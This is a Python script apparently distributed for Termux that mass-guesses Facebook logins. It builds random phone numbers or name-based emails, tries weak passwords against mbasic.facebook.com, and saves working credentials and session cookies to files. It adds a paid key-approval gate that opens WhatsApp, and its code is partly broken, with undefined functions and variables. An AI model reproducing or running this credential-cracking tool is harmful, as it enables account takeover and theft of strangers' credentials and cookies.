import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;96m' # 

H = '\033[1;94m' # 

K = '\x1b[1;93m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

        

def main_apv():

    imt="110Y=="

    ak="6T9_100RS"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("༄•───────────────────────────────────────•༄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇📥📬")
        print ("༄•───────────────────────────────────────•༄")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print ("༄•───────────────────────────────────────•༄")
        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("")
        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("༄•───────────────────────────────────────•༄")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/+8801907048765?text=' + tks)

        

    r1=requests.get("https://github.com/R1B-6T9/R1B-6T9/blob/main/R1B-6T9.txt").text

    if key1 in r1:

        R()

    else:

        os.system("clear")

        print(logo)

        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL RABBY")     
           
        print ("             \033[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄•───────────────────────────────────────•༄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1

        os.system('am start https://wa.me/+8801907048765?text=' + tks)

logo ="""          

'########:::::'##:::'########::::::::::::'#######::'########::'#######::
 ##.... ##::'####::: ##.... ##::::::::::'##.... ##:... ##..::'##.... ##:
 ##:::: ##::.. ##::: ##:::: ##:::::::::: ##::::..::::: ##:::: ##:::: ##:
 ########::::: ##::: ########::'#######: ########::::: ##::::: ########:
 ##.. ##:::::: ##::: ##.... ##:........: ##.... ##:::: ##:::::...... ##:
 ##::. ##::::: ##::: ##:::: ##:::::::::: ##:::: ##:::: ##::::'##:::: ##:
 ##:::. ##::'######: ########:::::::::::. #######::::: ##::::. #######::
..:::::..:::......::........:::::::::::::.......::::::..::::::.......:::

........................

    
            \033[1;37m \033[1;36m\033[1;37m═\033[44m\033[1;37m[ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐦𝐲 𝐰𝐨𝐫𝐥𝐝🌍 ]\x1b[0m═\033[1;36m\033[1;37m
    
\033[1;37m╔\033[1;36m════\033[1;37m═══════════════════\033[1;36mRIFAT✯RITU\033[1;37m═════════════════\033[1;36m════\033[1;37m╗
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴀᴜᴛʜᴏʀ]\033[1;31m  ➟  \033[1;32mRABBY VAU        \033[1;31m       │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ꜰᴀᴄᴇʙᴏᴏᴋ]\033[1;31m➟  \033[1;32mRabby Ahmed          \033[1;31m      │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢɪᴛʜᴜʙ]\033[1;31m  ➟ \033[1;32m R1B-6T9          \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ʏᴏᴜᴛᴜʙᴇ]\033[1;31m ➟  \033[1;32mRABBY VAU                \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴠᴇʀꜱᴏɴ]\033[1;31m  ➟  \033[1;32m1.1                   \033[1;31m      │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢʀᴏᴜᴘ]\033[1;31m   ➟  \033[1;32mR1B-6T9 TERMUX COMMAND \033[1;37m {\033[1;36mR1B-6T9\033[1;37m} \033[1;31m     │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴡʜᴀᴛꜱᴀᴘᴘ]\033[1;31m➟  \033[1;32m01907048765\033[1;37m \033[1;36m \033[1;37m \033[1;31m                     │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɴᴇᴛᴡᴏʀᴋ]\033[1;31m ➟  \033[1;32m3G,4G,5G \033[1;37m {\033[1;36mON Mobile Data+Wifi\033[1;37m} \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴄᴏɴᴛᴀᴄᴛ]\033[1;31m ➟  \033[1;32mmd.srabby309@gmail.com\033[1;37m \033[1;36m\033[1;37m \033[1;31m │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴛᴏᴏʟꜱ]\033[1;31m   ➟  \033[1;32mPAK RANDOM CLONING \033[1;37m  \033[1;31m              │
\033[1;37m╚\033[1;36m════\033[1;37m═════\033[41m\033[1;37m[ 𝙉𝙖 𝙭𝙪𝙙𝙞 𝙁𝙢𝙯 𝙉𝙖 𝙭𝙪𝙙𝙞 𝘾𝙚𝙡𝙚𝙗𝙧𝙞𝙩𝙮🖕 ]\x1b[0m═════\033[1;36m═════\033[1;37m╝

\033[1;31m========================================================"""

		
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [01] Random Number Clone")
        print(" [02] Random Email Clone ")
        print(" [00] Exit")
        print("\033[1;32m â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
        Mumit =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/profile.php?id=100087345804861')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    print("\033[1;32m â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
        for guru in user:
            UID = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,UID,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(' [?] Target fast name : ')
    os.system('clear')
    print(logo)
    kodex = input(' [?] Target last name :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
    doamin = input(' [?] Terget doamin : ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
    limit = int(input('[?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;97m[+] Process has been started')
        print(' \033[1;97m[!] Wait for ids ')
        print(' \033[1;97m[!] Use flight mode for speed up ')
        print("\033[1;32m â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”")
        for guru in user:
            UID = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,UID,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')
def rcrack1(UID,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mR1B-6T9\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":UID,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[R1B-6T9-OK] {UID} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/ok.txt', 'a').write( UID+' | '+ps+'\n')
                oks.append(UID)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[R1B-6T9-CP] {cid}|{ps}")
                open('/sdcard/cp.txt', 'a').write( UID+' | '+ps+' \n')
                cps.append(UID)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[R1B-6T9] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()